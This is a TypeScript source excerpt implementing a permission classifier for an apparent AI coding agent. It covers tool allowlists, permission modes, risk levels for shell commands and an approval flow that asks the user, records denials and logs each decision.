// A1 hardening: tools that `acceptEdits` mode will auto-allow without
// asking. Everything else falls through to `ask`. Read-only tools
// (Read/Glob/Grep) reach `allow` through rule matching or default
// classification; they do not need to be in this list.
//
// Keep this set tight. Adding a tool here means "the user is OK with
// this tool running silently when they opt into acceptEdits".
export const ACCEPT_EDITS_ALLOWLIST: ReadonlySet<string> = new Set([
  "Write",
  "Edit",
  "ApplyPatch",
  "NotebookEdit",
  "TodoWrite",
]);

export class PermissionClassifier {
  private denialTracker = new DenialTracker();
  /**
   * Turn-scoped logger so permission events (ask/decision/auto-deny) are
   * tagged with the current turn/turnId. Falls back to the root logger so
   * tests and ad-hoc usages still write log lines.
   */
  private log: typeof rootPermLogger = rootPermLogger;

  constructor(
    private rules: PermissionRule[],
    private defaultMode: PermissionMode = "default",
    private approvalBackend: ApprovalBackend = new HeadlessApprovalBackend("deny-all"),
  ) {}

  setLogger(log: typeof rootPermLogger): void {
    this.log = log;
  }

  /** Replace mode + backend in place so live tool execution sees the change. */
  reconfigure(
    mode: PermissionMode,
    approvalBackend: ApprovalBackend,
    rules?: PermissionRule[],
  ): void {
    this.defaultMode = mode;
    this.approvalBackend = approvalBackend;
    if (rules) this.rules = rules;
  }

  getMode(): PermissionMode {
    return this.defaultMode;
  }

  classify(toolName: string, args: Record<string, unknown>): PermissionDecision {
    // bypassPermissions mode overrides everything
    if (this.defaultMode === "bypassPermissions") return "allow";

    // Check explicit rules (ordered by specificity)
    for (const rule of this.rules) {
      if (this.matchesRule(rule, toolName, args)) {
        return rule.decision;
      }
    }

    // YOLO classifier for Bash commands
    if (toolName === "Bash") {
      const level = classifyBashCommand(String(args.command ?? ""));
      if (level === "dangerous") return "ask";
      if (level === "safe-read") return "allow";
      if (
        level === "safe-write" &&
        (this.defaultMode === "acceptEdits" || this.defaultMode === "auto")
      ) {
        return "allow";
      }
      if (level === "unsafe") return "ask";
    }

    // Fall back to default mode
    switch (this.defaultMode) {
      case "dontAsk":
        return "deny";
      case "acceptEdits":
        // A1 hardening: acceptEdits is an allowlist, not allow-all.
        // Only auto-allow tools that mutate the workspace in ways the
        // user has explicitly opted in to. Everything else (network,
        // shell, MCP, etc.) still requires an interactive prompt.
        return ACCEPT_EDITS_ALLOWLIST.has(toolName) ? "allow" : "ask";
      default:
        return "ask";
    }
  }

  async handleAsk(
    toolName: string,
    args: Record<string, unknown>,
    reason?: string,
    opts?: { sessionId?: string },
  ): Promise<boolean> {
    if (this.defaultMode === "dontAsk") {
      this.log.info("permission.auto_deny", {
        cat: "permission",
        tool: toolName,
        reason: "dontAsk_mode",
      });
      return false;
    }
    if (this.defaultMode === "bypassPermissions") {
      this.log.info("permission.auto_allow", {
        cat: "permission",
        tool: toolName,
        reason: "bypassPermissions_mode",
      });
      return true;
    }

    // Check denial tracker — if too many denials, auto-deny
    if (this.denialTracker.shouldWarn(toolName)) {
      this.log.warn("permission.auto_deny", {
        cat: "permission",
        tool: toolName,
        reason: "denial_tracker_threshold",
      });
      return false;
    }

    const riskLevel = this.assessRisk(toolName, args);
    const span = this.log.span("permission.ask", {
      cat: "permission",
      tool: toolName,
      riskLevel,
    });
    let result: ApprovalResult;
    try {
      const baseDescription = this.describeToolCall(toolName, args);
      const description = reason
        ? `${baseDescription}\n\nReason (from pre_tool_use hook): ${reason}`
        : baseDescription;
      result = await this.approvalBackend.requestApproval({
        ...(opts?.sessionId ? { sessionId: opts.sessionId } : {}),
        toolName,
        args,
        description,
        riskLevel,
      });
    } catch (err) {
      span.fail(err, { tool: toolName });
      throw err;
    }

    if (result.approved) {
      this.denialTracker.recordSuccess(toolName);
    } else {
      this.denialTracker.record(toolName);
    }

    span.end({
      tool: toolName,
      approved: result.approved,
      // `scope` is set by the interactive backend when the user picks
      // "for this session" / "for this project"; absent for one-shot answers.
      scope: (result as { scope?: string }).scope,
      reason: !result.approved ? (result as { reason?: string }).reason : undefined,
    });

    return result.approved;
  }

  /** Get denial warning message if the model keeps getting denied. */
  getDenialWarning(toolName: string): string | undefined {
    if (this.denialTracker.shouldWarn(toolName)) {
      return this.denialTracker.getWarningMessage(toolName);
    }
    return undefined;
  }

  private matchesRule(
    rule: PermissionRule,
    toolName: string,
    args: Record<string, unknown>,
  ): boolean {
    // Delegate to the shared matcher so the classifier and the session cache
    // agree on rule semantics (the JSON-string-vs-RegExp handling, the head-
    // command narrowing for Bash, etc.).
    return ruleMatches(rule, toolName, args);
  }

  private isDangerousCommand(args: Record<string, unknown>): boolean {
    const command = String(args.command ?? "");
    return DANGEROUS_PATTERNS.some((p) => p.test(command));
  }

  private assessRisk(toolName: string, args: Record<string, unknown>): "low" | "medium" | "high" {
    if (toolName === "Bash" && this.isDangerousCommand(args)) return "high";
    if (["Write", "Edit"].includes(toolName)) return "medium";
    if (toolName === "Bash") return "medium";
    // Only genuinely read-only built-ins are "low" (the sole tier
    // AutoApprovalBackend approves with no delegate). Everything else —
    // crucially every MCP tool, which can delete records, send messages, or
    // deploy — defaults to "medium" so auto mode delegates it (UI prompt) or
    // fails closed, instead of blind-approving an unknown side-effecting tool.
    if (READ_ONLY_TOOLS.has(toolName)) return "low";
    return "medium";
  }

  /**
   * Short, human-friendly subtitle. The UI shows this under the tool title;
   * full args (command bodies, diffs, etc.) come from the args field, so this
   * stays compact — no truncation here, just a label.
   */
  private describeToolCall(toolName: string, args: Record<string, unknown>): string {
    switch (toolName) {
      case "Bash":
        return String(args.description ?? "Run shell command");
      case "Write":
        return `Create or overwrite ${args.file_path}`;
      case "Edit":
        return `Modify ${args.file_path}`;
      default:
        return toolName;
    }
  }
}
